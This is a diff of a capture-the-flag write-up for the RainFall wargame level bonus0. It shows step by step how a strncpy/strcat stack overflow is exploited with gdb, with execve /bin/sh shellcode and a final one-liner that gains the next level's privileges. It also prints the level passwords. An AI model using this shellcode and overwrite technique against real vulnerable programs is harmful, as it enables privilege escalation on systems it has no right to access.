@@ -1,15 +1,18 @@
 * Data Gathering
 #+begin_src shell
-level9@RainFall:~$ su bonus0
-Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
-bonus0@RainFall:~$ readelf -p .rodata bonus0
-String dump of section '.rodata':
-  [     8]   - 
-  [     c]
+  level9@RainFall:~$ su bonus0
+  Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+  #+end_src
+** Strings 
+#+begin_src shell
+  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
+  bonus0@RainFall:~$ readelf -p .rodata bonus0
+  String dump of section '.rodata':
+    [     8]   - 
+    [     c]
 #+end_src
-
+** Functions
 #+begin_src shell
 (gdb) info functions
 0x08048380  read@plt -> read from a fd
@@ -21,10 +24,35 @@ String dump of section '.rodata':
 0x080484b4  p    -> custom fun 1
 0x0804851e  pp   -> custom fun 2
 0x080485a4  main -> function
+#+end_src
+** Global vars
+#+begin_src shell
+info variables
+All defined variables:
+
+Non-debugging symbols:
+0x08048698  _fp_hw
+0x0804869c  _IO_stdin_used
+0x080487f4  __FRAME_END__
+0x080497f8  __CTOR_LIST__
+0x080497f8  __init_array_end
+0x080497f8  __init_array_start
+0x080497fc  __CTOR_END__
+0x08049800  __DTOR_LIST__
+0x08049804  __DTOR_END__
+0x08049808  __JCR_END__
+0x08049808  __JCR_LIST__
+0x0804980c  _DYNAMIC
+0x080498d8  _GLOBAL_OFFSET_TABLE_
+0x08049904  __data_start
+0x08049904  data_start
+0x08049908  __dso_handle
+0x0804990c  completed.6159
+0x08049910  dtor_idx.6161
 
 #+end_src
-
 * Binary Analisys.
+** Disass functions
   #+begin_src shell
 (gdb) disass main
 Dump of assembler code for function main:
@@ -109,56 +137,216 @@ pp
 End of assembler dump.
 
 #+end_src
+** Source
 # https://dogbolt.org/?id=e155fda2-581f-4305-ad94-25b044fdefd5#BinaryNinja=151&Ghidra=176&Hex-Rays=145
 # using hex of Decompiler online HexRays.
 [[source]]
-* Explotation
-How much
-then pass the shellcode. same as level9 http://shell-storm.org/shellcode/files/shellcode-827.php
-python -c 'print "A" * 9 + "\xcd\xeb\xff\xbf"' + 7 * "B" | xxd
-0000000: 4141 4141 4141 4141 41cd ebff bf0a       AAAAAAAAA.....
-####### 
-Not working cause outside the function p the value of her buffer is undefined.
-i will use a shell code as env var
-3973
-NOP + shellcode
+** Entrypoint
+May i use strncpy that in case ~n <= len(str)~ don't put the char '\0'
+Could make that ~strcpy~ overflow ~cpy s1 and s2~ until char '\0'
+*** Expect behaviour 
+#+begin_src shell
+   - 
+  a
+   - 
+  b
+  a b
+#+end_src
+*** Proof of  concept
+#+begin_src shell
+ r
+Starting program: /home/user/bonus0/bonus0
+ - 
+AAAAAAAAAAAAAAAAAAAA
+ - 
+b
+AAAAAAAAAAAAAAAAAAAAb b
 
-export CODE=`/bin/echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"`
-# let's take the pointer to the env
-(gdb) x/40s *((char **)environ)
-0xbfffff19:	 "CODE=j\vX\231Rh//shh/bin\211\343\061\311Í€"
-# 1 str fill with 20 random not null char
-# 2 str 9 prefix + pointer to env shellcode + suffix to reach 20 B
-bonus0@RainFall:~$  (python -c 'print "A" * 20' ; python -c 'print "A"*9 + "\xbf\xff\xff\x1e"[::-1] + "B" * 7' ; cat) | ./bonus0
+#+end_src
+** Explotation idea
+*** Get more data.
+**** Need the offset to main return va
+#+begin_src shell
+  b * main + 13 # get the ptr of buffer to add as a param to pp.
+  i r eax
+  eax            0xbffffc26	-1073742810 # 0xbffffc26 is buffer ptr start
+  x/2a $ebp
+  0xbffffc58:	0x0	0xb7e454d3 <__libc_start_main+243>
+  x/a $ebp + 4
+  0xbffffc5c:	0xb7e454d3 <__libc_start_main+243>
+  # main ret va
+  0xbffffc5c
+p/d ($ebp + 4) - $eax
+$2 = 54 
+#+end_src
+~offset = 54B~
+***** How to write that ammount in th buffer main.
+  Since the maximum can write to s1 and s2 = 20
+  This is the strategy use the overflow.
+#+begin_src shell
+  strcpy(buffer_main, s1) == 39B
+  buffer_main[strlen(buffer_main)] = ' '; 39B
+  buffer_main[strlen(buffer_main)+ 1] = '\0'; 40B
+  strcat(buffer_main, s2) == 60B
+  54B < 60B; Is exploitable.
+  54-40 = 14 
+  # In s2 the shellcode va must start at 13 in the second read
+  # In this case we couldn't modify the stack for this overflow for use exit be cause 
+#+end_src
+**** Shellcode
+then pass the shellcode. same as level9 http://shell-storm.org/shellcode/files/shellcode-827.php
+***** Where to storage the shellcode
+since in ~p~ there is a huge buffer that allocate 0x1000 -> 4096B i got plenty space for storage there the payload.
+****** How to use that buffer without overwrite payload
+******* TLDR
+#+begin_src shell
+  First read use 20 or more chars.
+  Second read use 20 chars end with "\n" char.
+#+end_src
+#+begin_src shell
+  Use the first read to add the payload to the p_buffer
+  Must begin over 20 chars.
+#+end_src
+
+******* Proof of concept
+******** First Read
+#+begin_src shell
+  I execute putting a sled of junk in this case 'A', with the next read should be overwritten followed by the shellcode is a text for check integrity.
+    x/s $eax
+    0xbfffeba0:	 'A' <repeats 20 times>, 'B' <repeats 180 times>...
+  x/s $eax + 20
+  0xbfffebb4:	 'B' <repeats 200 times>...
+  shellcode start va = 0xbfffebb4
+#+end_src
+******** Second Read
+#+begin_src shell
+   - 
+  AAAAAAAAAAAAAAAAAAA
+
+  Breakpoint 2, 0x080484f4 in p ()
+  (gdb) x/s $eax
+  0xbfffeba0:	 'A' <repeats 19 times>, "\n", 'B' <repeats 180 times>...
+  (gdb) x/s $eax + 20
+  0xbfffebb4:	 'B' <repeats 200 times>...
+#+end_src
+it overwrite main return with 0x41414141 or "AAAA"
+******** Check overwrite the main return
+"DCBA" -> 0x41424344
+#+begin_src shell
+    Breakpoint 1, 0x080484f4 in p ()
+    (gdb) x/s $eax
+    0xbfffeba0:	 '@' <repeats 14 times>, "ABCD@\n"
+    (gdb) x/s $eax + 20
+    0xbfffebb4:	 ""
+    (gdb) x/s $eax + 19
+    0xbfffebb3:	 "\n"
+    Program received signal SIGSEGV, Segmentation fault.
+    0x44434241 in ?? () little endian.
+
+   @@@@@@@@@@@@@@DCBA@
+
+  Breakpoint 1, 0x080484f4 in p ()
+  (gdb) x/s $eax
+  0xbfffeba0:	 '@' <repeats 14 times>, "DCBA@\n"
+  (gdb) x/s $eax+19
+  0xbfffebb3:	 "\n"
+  (gdb) x/s $eax+20
+  0xbfffebb4:	 ""
+Program received signal SIGSEGV, Segmentation fault.
+0x41424344 in ?? ()
+#+end_src
+*** Data got it:
+1. shellcode start va = 0xbfffebb4
+
+2. read 1 with shellcode ~echo -e "AAAAAAAAAAAAAAAAAAAA\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"~
+3. read 2 with va to shellcode ~echo -e "@@@@@@@@@@@@@@\xb4\xeb\xff\xbf@"~
+4. test this work fine in gdb.
+     i use <<< $(subshell for pass stdin to gdb)
+   #+begin_src shell
+                         bonus0@RainFall:~$ gdb -q ./$USER -ex "b * p + 64"
+                         Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
+                         Breakpoint 1 at 0x80484f4
+                         (gdb) r <<<$(echo -e "AAAAAAAAAAAAAAAAAAAA\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; echo -e "@@@@@@@@@@@@@@\xb4\xeb\xff\xbf@"; cat -)
+                         Starting program: /home/user/bonus0/bonus0 <<<$(echo -e "AAAAAAAAAAAAAAAAAAAA\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; echo -e "@@@@@@@@@@@@@@\xb4\xeb\xff\xbf@"; cat -)
+                         id
+                         cat /home/user/bonus1/.pass
+
+                         # Process first read all at once.
+                    (gdb) x/s $eax
+                    0xbfffeba0:	 'A' <repeats 20 times>, "1\300Ph//shh/bin\211\343PS\211\341\260\vÍ€ ", '@' <repeats 14 times>"\264, \353\377\277@ id cat /home/user/bonus1/.pass\n"
+                    (gdb) x/10i $eax+20
+                       0xbfffebb4:	xor    %eax,%eax
+                       0xbfffebb6:	push   %eax
+                       0xbfffebb7:	push   $0x68732f2f
+                       0xbfffebbc:	push   $0x6e69622f
+                       0xbfffebc1:	mov    %esp,%ebx
+                       0xbfffebc3:	push   %eax
+                       0xbfffebc4:	push   %ebx
+                       0xbfffebc5:	mov    %esp,%ecx
+                       0xbfffebc7:	mov    $0xb,%al
+                       0xbfffebc9:	int    $0x80
+
+                     # may is failing cause gdb create enviroment vars.
+          	     # ssh env
+               SHELL=/bin/bash
+               SSH_CLIENT=10.0.2.2 38356 4242
+               OLDPWD=/home/user/bonus0
+               SSH_TTY=/dev/pts/0
+               USER=bonus0
+               LS_COLORS=
+               PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+               PWD=/home/user/bonus0
+               LANG=en_US.UTF-8
+               HOME=/home/user/bonus0
+               SHLVL=4
+               LOGNAME=bonus0
+               SSH_CONNECTION=10.0.2.2 38356 10.0.2.15 4242
+               _=/usr/bin/env
+               #gdb ones
+               # show environ
+          SHELL=/bin/bash
+          SSH_CLIENT=10.0.2.2 38356 4242
+          OLDPWD=/home/user/bonus0
+          SSH_TTY=/dev/pts/0
+          USER=bonus0
+          LS_COLORS=
+          PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+          PWD=/home/user/bonus0
+          LANG=en_US.UTF-8
+          HOME=/home/user/bonus0
+          SHLVL=4
+          LOGNAME=bonus0
+          SSH_CONNECTION=10.0.2.2 38356 10.0.2.15 4242
+          _=/usr/bin/gdb
+          LINES=30
+          COLUMNS=135
+          # Fix
+          unset env LINES
+          unset env COLUMNS
+     new buffer ptr 0xbfffec40
+     old buffer ptr 0xbfffeba0
+x/s $eax+20
+shellcode payload 0xbfffec54:
+
+
+   #+end_src
+**** Update data
+
+#+begin_src shell
+(python -c 'print "A" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; sleep 1; python -c 'print "@" * 14 + "\xbf\xff\xec\x54"[::-1] + "@"'; sleep 1; cat -)
+#+end_src
+
+   
+* Explotation
+
+#+begin_src shell
+(python -c 'print "A" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; sleep 1; python -c 'print "@" * 14 + "\xbf\xff\xec\x54"[::-1] + "@"'; sleep 1; cat -)  | ./$USER
  - 
  - 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAÿÿ¿BBBBBBBôý· AAAAAAAAAÿÿ¿BBBBBBBôý·
-ls
-ls: cannot open directory .: Permission denied
+AAAAAAAAAAAAAAAAAAAA@@@@@@@@@@@@@@Tìÿ¿@ @@@@@@@@@@@@@@Tìÿ¿@
 id
 uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
 cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
-** detect entry vectors
 
-# logic of the exploit
-strncpy()  Warning: If there is no null byte among the first n bytes of src, the string placed in dest will not be null-terminated.
-we could use this to avoid the ' ' in the shellcode.
-# with buffer overflow change in stack the return of a p, with the shellcode
-## How to proceed
-### Test the offset
-#### first string of > 20
-AAAAAAAAAAAAAAAAAAAA
-#### pattern to get the offset https://wiremask.eu/tools/buffer-overflow-pattern-generator/
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aaôý· Aa0Aa1Aa2Aa3Aa4Aa5Aaôý· -> puts the concat of the string and look like the second appear twice ;)
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41336141 in ?? ()
-# it says the offset is of 9 B. -> cause is write it two times maybe could be tricky overlap.
-#### I need to get the buffer address to put before offset.
-   0x080484d0 <+28>:	lea    eax,[ebp-0x1008] -> buffer
-(gdb) b *p+28
-(gdb) r
-(gdb) p $ebp - 0x1008
-$1 = (void *) 0xbfffeb90 -> buff addr
+#+end_src
